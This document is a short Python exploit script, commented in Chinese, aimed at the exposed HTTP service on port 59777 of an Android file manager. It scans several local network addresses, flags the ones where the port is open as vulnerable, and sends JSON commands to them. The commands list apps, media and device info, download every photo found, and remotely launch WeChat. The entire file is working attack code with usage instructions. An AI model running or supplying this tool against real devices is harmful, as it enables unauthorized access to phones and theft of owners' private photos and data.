#coding:utf-8
from socket import *
import requests
import re
import json
import sys
addrs = []
def poc():
    for ip in range(101, 104):
        addr = "192.168.0."+str(ip)
        s = socket(AF_INET, SOCK_STREAM)
        s.settimeout(1)
        if not s.connect_ex((addr, 59777)):
            s.close()
            print("[+]"+addr+"存在漏洞")
            addrs.append(addr)
        else:
            continue
            s.close()
    print("[+]扫描结束\n[+]执行操作"+sys.argv[1])

def cmd(cmd):
    poc()
    for addr in addrs:
        headers = {"Content-Type": "application/json"}
        address = 'http://' + addr + ':59777'
        data = '{ "command":' + cmd + ' }'
        r = requests.post(address, headers=headers, data=data)

        if cmd == 'listPics':#下载图片
            image = re.compile(r'/s.*jpg')
            for i in  image.findall(r.text):
                imageurl =  address  + i            
                filename = i.rsplit('/', 1)[1]
                r = requests.get(imageurl, headers=headers)
                print("[+]正在下载"+i)
                with open(filename, 'wb') as f:
                    f.write(r.content)
                    #break
        elif cmd == 'wx':#启动微信
            data = '{"command":"appLaunch", "appPackageName": "com.tencent.mm"}'
            r = requests.post(address, headers=headers, data=data)
        else:

            print(r.text)
        
def main():
    if len(sys.argv) > 1:
        cmd(sys.argv[1])
    else:
        print('Usage:')
        print('python3 es.py wx')
        print('python3 es.py listPics')
        print('python3 es.py listApps')
        print('python3 es.py listAudios')
        print('python3 es.py listVideos')
        print('python3 es.py listAppsPhone')
        print('python3 es.py getDeviceInfo')
        print('python3 es.py listAppsAll')

if __name__ == '__main__':
    main()
